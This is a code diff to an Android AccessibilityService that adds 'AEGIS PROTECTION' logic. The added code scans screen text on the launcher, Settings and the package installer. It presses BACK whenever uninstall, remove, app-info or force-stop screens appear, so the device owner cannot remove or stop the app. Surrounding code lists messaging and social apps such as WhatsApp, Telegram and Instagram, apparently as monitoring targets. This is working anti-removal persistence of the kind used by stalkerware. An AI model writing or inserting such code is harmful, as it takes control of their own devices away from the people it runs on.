@@ -51,10 +51,30 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+        
+        val pkgName = event.packageName?.toString() ?: return
 
         // --- 0. AEGIS PROTECTION (Highest Priority) ---
-        // If user is in Settings -> App Info -> Cortex, perform BACK action
-        if (event.packageName == "com.android.settings") {
+        
+        // A. LAUNCHER GUARD (Anti-Long Press)
+        // Only scans if we are on the Home Screen (Launcher)
+        if (pkgName == getLauncherPackageName()) {
+             val root = rootInActiveWindow
+             if (root != null) {
+                 val text = StringBuilder()
+                 extractText(root, text)
+                 val content = text.toString()
+                 // If the popup menu appears with danger keywords
+                 if (content.contains("Uninstall", true) || content.contains("Remove", true) || content.contains("App info", true)) {
+                     DebugLogger.log("AEGIS", "Blocked Home Screen modification")
+                     performGlobalAction(GLOBAL_ACTION_BACK)
+                     return
+                 }
+             }
+        }
+
+        // B. SETTINGS GUARD (Anti-Force Stop)
+        if (pkgName == "com.android.settings" || pkgName == "com.google.android.packageinstaller" || pkgName == "com.android.packageinstaller") {
             val root = rootInActiveWindow
             if (root != null) {
                 val screenText = StringBuilder()
@@ -193,5 +213,12 @@ class MyAccessibilityService : AccessibilityService() {
         val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
         for (app in apps) defaults.put(app, JSONObject())
         return defaults
+    }
+
+    private fun getLauncherPackageName(): String {
+        val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
+        intent.addCategory(android.content.Intent.CATEGORY_HOME)
+        val resolveInfo = packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
+        return resolveInfo?.activityInfo?.packageName ?: ""
     }
 }
